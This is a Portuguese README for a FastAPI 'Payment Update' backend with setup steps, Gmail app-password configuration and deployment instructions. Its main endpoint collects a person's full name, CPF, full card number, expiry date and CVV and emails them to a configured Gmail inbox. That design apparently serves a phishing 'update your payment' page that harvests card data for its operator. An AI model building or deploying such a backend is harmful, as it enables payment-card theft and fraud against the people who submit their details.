# Payment Update API - Backend

FastAPI backend para gerenciar atualizações de pagamento e envio de emails.

## Setup e Configuração

### 1. Instalar Dependências

```bash
cd backend
pip install -r requirements.txt
```

### 2. Configurar Variáveis de Ambiente

Crie um arquivo `.env` na pasta `backend` com as credenciais do Gmail:

```bash
cp .env.example .env
```

Edite o arquivo `.env` com suas credenciais:

```
EMAIL_FROM=seu-email@gmail.com
EMAIL_PASSWORD=sua-senha-de-app-gmail
EMAIL_TO=email-destinatario@gmail.com
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
```

### 3. Gerar Senha de App do Gmail

Para usar o Gmail com FastAPI:

1. Ative autenticação de dois fatores em sua conta Google
2. Vá para [Google App Passwords](https://myaccount.google.com/apppasswords)
3. Selecione "Mail" e "Windows Computer" (ou seu dispositivo)
4. Google gerará uma senha de 16 caracteres
5. Use essa senha no arquivo `.env` como `EMAIL_PASSWORD`

### 4. Rodar o Backend

```bash
python main.py
```

Ou com uvicorn diretamente:

```bash
uvicorn main:app --reload --host 0.0.0.0 --port 8000
```

O servidor estará disponível em: `http://localhost:8000`

## Endpoints

### GET `/`
Health check - verifica se a API está funcionando.

**Response:**
```json
{
  "status": "API is running",
  "service": "Payment Update Service"
}
```

### POST `/api/update-payment`
Recebe dados de pagamento e envia email.

**Request:**
```json
{
  "nomeCompleto": "João da Silva",
  "cpf": "123.456.789-00",
  "numeroCartao": "4111 1111 1111 1111",
  "validade": "12/25",
  "cvv": "123"
}
```

**Response (Sucesso):**
```json
{
  "success": true,
  "message": "Pagamento atualizado e e-mail enviado com sucesso!",
  "timestamp": "2024-01-15T10:30:45.123456"
}
```

**Response (Erro):**
```json
{
  "detail": "Erro ao enviar e-mail. Tente novamente mais tarde."
}
```

### POST `/api/test-email`
Testa a configuração de email enviando um email de teste.

**Response:**
```json
{
  "success": true,
  "message": "E-mail de teste enviado com sucesso!"
}
```

## Troubleshooting

### "Falha na autenticação do Gmail"
- Verifique se a senha de app está correta
- Certifique-se de que a autenticação de dois fatores está ativada
- Regenere a senha de app no Google

### "Conexão recusada em localhost:8000"
- Verifique se o backend está rodando: `python main.py`
- Verifique a porta configurada (padrão: 8000)

### "CORS Error"
- Verifique se a origem do frontend está na lista de `origins` no `main.py`
- Adicione `http://seu-dominio.com` à lista se necessário

## Arquitetura

```
backend/
├── main.py              # Aplicação FastAPI principal
├── requirements.txt     # Dependências Python
├── .env.example        # Template de variáveis de ambiente
├── .env                # Variáveis de ambiente (não commitar)
└── README.md           # Esta documentação
```

## Segurança

⚠️ **IMPORTANTE:**
- Nunca commite o arquivo `.env` com credenciais reais
- Use App Passwords do Google, não sua senha principal
- Implemente autenticação se este backend for publicado
- Considere usar tokens JWT para produção

## Desenvolvimento

Para desenvolvimento local com hot-reload:

```bash
uvicorn main:app --reload
```

Para ver logs detalhados:

```bash
uvicorn main:app --reload --log-level debug
```

## Deployment

Para colocar em produção:

1. Configure variáveis de ambiente no servidores (Heroku, Railway, etc)
2. Use um servidor ASGI em produção (Gunicorn + Uvicorn):

```bash
gunicorn main:app --workers 4 --worker-class uvicorn.workers.UvicornWorker
```

3. Implemente autenticação e rate limiting
4. Use HTTPS obrigatoriamente
